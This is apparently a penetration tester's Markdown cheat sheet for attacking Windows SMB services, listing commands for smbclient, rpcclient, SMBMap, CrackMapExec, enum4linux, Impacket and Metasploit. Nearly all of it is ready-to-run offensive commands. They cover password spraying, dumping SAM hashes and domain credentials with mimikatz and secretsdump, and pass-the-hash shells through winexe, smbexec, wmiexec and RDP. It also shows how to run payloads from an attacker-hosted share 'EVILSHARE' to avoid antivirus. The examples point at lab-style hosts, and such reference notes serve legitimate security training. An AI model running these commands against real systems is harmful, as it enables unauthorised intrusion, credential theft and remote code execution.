# Network Enum: SMB
```default
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______) and co.
 -----------------------------------------------------------------------------
```

An overview of SMB enum tools and clients.

* [File Transfers](./smb.md#file-transfers)
* [Smbclient](./smb.md#smbclient)
* [Rpcclient](./smb.md#rpcclient)
* [SMBMap](./smb.md#smbmap)
* [CrackMapExec](./smb.md#crackmapexec)
* [enum4linux](./smb.md#enum4linux)
* [Impacket](./smb.md#impacket)
* [SMB Code Execution](./smb.md#smb-code-execution)
* [Banner Grabbing](./smb.md#banner-grabbing)
* [Metasploit modules](./smb.md#metasploit-modules)


Nmap command for SMB vuln scanning:

```bash
sudo nmap -sV -p139,445 --script=smb-protocols,smb-vuln* $ip
```

In order to interact with very old SMB protocols, update your `/etc/samba/smb.conf` with:

```bash
[global]
client min protocol = LANMAN1
```

Obviously lowering your supported min SMB protocol version to ancient sumeric is a security risk, but I asssume you know what you are doing.


## File Transfers

Yes, you can also use it as intended.

```bash
## start impacket smbserver in linux directory
bash> smbserver.py EVILSHARE .

## copy files from and to target machine
cmd> copy .\file \\192.xxx.xxx.xxx\EVILSHARE\file

## copy entire directory
cmd> robocopy C:\directory_you_want_to_copy \\192.xxx.xxx.xxx\EVILSHARE\directory_you_want_to_copy /E
```

You can also execute binaries and scripts straight from a remote share. Can help with AV issues.
```bash
### execute from SMB share
\\<remote_ip>\<remote_smb_share>\somefile.bat
\\<remote_ip>\<remote_smb_share>\somefile.exe
```

## Smbclient

The regular smbclient, which can be found on most Linux distros.

```bash
# List shares
smbclient -U anonymous -L //10.10.10.130

# Interact with share
smbclient -U anonymous //10.10.10.130/sharename
smb: \> ls
smb: \> get <file>

# NT errors fix for old SMB versions
smbclient -p 139 -L //10.10.10.130/ --option='client min protocol=NT1'

# backslash variant
smbclient \\\\10.10.10.130\\tmp

# common commands
> help
> dir
> ls
> del <filename>
> makedir
> put <file>        # upload exact filename
> get <file>        # download exact filename
> mget <pattern>    # download files matching pattern
> mput <pattern>
> quit

# change local dir on your own machine (download destination)
> lcd '~/whatever/dir'

# download all files
> mask ""
> recurse ON
> prompt OFF
> mget *

# Download all files (one liner)
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
```

## Rpcclient

* Further reading: https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#rpclient

Client for MS-RPC. Useful for (manually) enumerating users and groups, but see below for automatic enum tools.

```bash
rpcclient -U '' -N 10.10.10.149
rpcclient -U 'username%password' 10.10.10.149

```

Enumerate domain users:
```bash
rpcclient> enumdomusers
rpcclient> queryuser 0x3e8
```

Enumerate domain groups:
```bash
rpcclient> enumdomgroups
rpcclient> querygroup 0x204
rpcclient> querygroupmem 0x204
```

Print username or SID (increment SID to find more users):
```bash
rpcclient> lookupnames <username/sid>
```

## SMBMap

SMB Enum tool. Lists file content and permissions of shares. It can deal with different SMB versions better than the manual smbclient. 

It also has limited RCE capabilites, but there are better tools for that.

```bash
# discover shares (without user)
smbmap -H 10.10.10.130
smbmap -H 10.10.10.130 -u anonymous
smbmap -H 10.10.10.130 -u Guest
smbmap -H 10.10.10.130 -u null

# show files of shares that are at least read-only
smbmap -H 10.10.10.130 -u anonymous -r --depth 5

# more examples
smbmap -H [host] -d [domain] -u [user] -p [password]
smbmap -H 192.168.1.102 -d metasploitable -u msfadmin -p msfadmin

smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20

# Command Execution
smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'
```

* Github: https://github.com/ShawnDEvans/smbmap


## enum4linux

The grandma of Windows enum scripts. It will riddle you with errors, but sometimes it still does a good job, especially when you are dealing with old machines/Workgroups/Domains.

It is based on the tools `smbclient`, `rpclient`, `net` and `nmblookup`. Useful for bruteforcing user account names via RID cycling, which is often possible on old machines.

```bash
enum4linux -a 10.10.10.178
```

## CrackMapExec

Network SMB scan:

```bash
crackmapexec smb 192.168.1.1/24
crackmapexec smb 192.168.1.1/24 -u CoolAdmin -p ARealGoodPassword 
crackmapexec smb 192.168.1.1/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
```

Mimikatz (sekurlsa::logonpasswords):
```bash
crackmapexec smb 192.168.1.1/24 -u Administrator -p Password1 -M mimikatz
```

Like SMBMap it can do code execution (admin required):
```bash
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
```

Dump SAM hashes (admin required):
```bash
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
```

Null sessions (empty user/pass):
```bash
crackmapexec smb <target(s)> -u '' -p ''
```

User/Pass spraying:
```bash
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
```

Useful parameters:
```bash
--local-auth --shares    # enumerate shares
--local-auth             # use local accounts rather than domain auth
--lusers                 # list logged in users
-x 'net user Administrator /domain' --exec-method smbexec    # code execution via smbexec
--pass-pol               # list password policy
--rid-brute              # RID bruteforcing
```



## Impacket 

On Kali you can install impacket with `sudo apt install impacket`. 

* Github: https://github.com/SecureAuthCorp/impacket

### Impacket: smbclient.py

Impacket comes with an smbclient as well. 

It offers more config options than the vanilla smbclient and is easier scriptable. It is particularly useful for Active Directory exploitation. 

```bash
smbclient.py [domain]/[user]@[host]
smbclient.py [domain]/[user]@[host] -dc-ip [domain-controller]
smbclient.py htb/svc-alfresco@FOREST -dc-ip 10.10.10.161
```

With password:
```bash
smbclient.py [domain]/[user]:[password]@[host]
```

Using ntlm auth:

```bash
smbclient.py [domain]/[user]@[host]
smbclient.py htb/someuser@somehost -hashes aad3b435b51404eeaad3b435b51404ee:0CB6948805F797BF2A82807973B89537
```

### Impacket: wmiexec.py

Code execution using WMI endpoint.

```bash
wmiexec.py [domain]/[user]:[password]@[host]
wmiexec.py htb/someuser@somehost -hashes aad3b435b51404eeaad3b435b51404ee:0CB6948805F797BF2A82807973B89537
```

### Impacket: dcomexec.py

Code execution using DCOM.

```bash
dcomexec.py -object MMC20 [domain]/[user]:[password]@[host]
dcomexec.py -object MMC20 htb/someuser@somehost -hashes aad3b435b51404eeaad3b435b51404ee:0CB6948805F797BF2A82807973B89537
```

### Impacket: secretsdump.py

This allows you to remotely dump secrets without requiring a shell on the target.

* Dump SAM to extract NTLM hashes of local users
* Use DCSync to extract domain credentials

```bash
secretsdump.py [domain]/[user]@[host]

# only dcsync
secretsdump.py -just-dc [domain]/[user]@[host] -hashes [nl]:[nt]
```


## SMB Code Execution

Gain a shell via SMB. Requires admin credentials or NTLM hash.

**Winexe**

```bash
winexe -U 'admin%password123' //<target_ip> cmd.exe
```

**Pass the Hash**

```bash
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>' //<target_ip> cmd.exe
```

**Impacket** can also do this, but the shell is a bit more rudimentary:

```bash
smbexec.py SECNOTES/Administrator:u6!4ZwgwOM#^OBf#Nwnh@10.10.10.97
smbexec.py DOMAIN/username:password@host

smbexec.py DOMAIN/username@host -hashes aad3b435b51404eeaad3b435b51404ee:0CB6948805F797BF2A82807973B89537
```

**RDP via pass-the-hash**

```bash
# you can install this on Kali
sudo apt update
sudo apt install freerdp-x11

freerdp-x11 /u:offsec /d:somedomain /pth:aad3b435b51404eeaad3b435b51404ee:0CB6948805F797BF2A82807973B89537 /v:10.10.10.102
```


## Banner Grabbing

Sometimes a server will not give you a banner to grab when you connect or scan with nmap, but you need it in order to enumerate for vulnerabilities. 

The following works with Samba.

Listen on the interface ("tun0" is your interface):

```bash
sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]'
```

Connect to the server:
```bash
smbclient -L <ip>
```

Also try Wireshark, if the above is not successful.


## Metasploit modules

**Password spray** (best module ever):
```bash
scanner/smb/smb_login
## lets you spray users and passwords to check for smb logins. 
##
## These settings are really useful:
# set BLANK_PASSWORDS true
# set USER_AS_PASS true
```

**Code execution using admin credentials:**
```bash
windows/smb/psexec_psh
admin/smb/psexec_command
auxiliary/scanner/smb/impacket/wmiexec
```

**Enum shares:**
```bash
auxiliary/scanner/smb/smb_enumshares
```

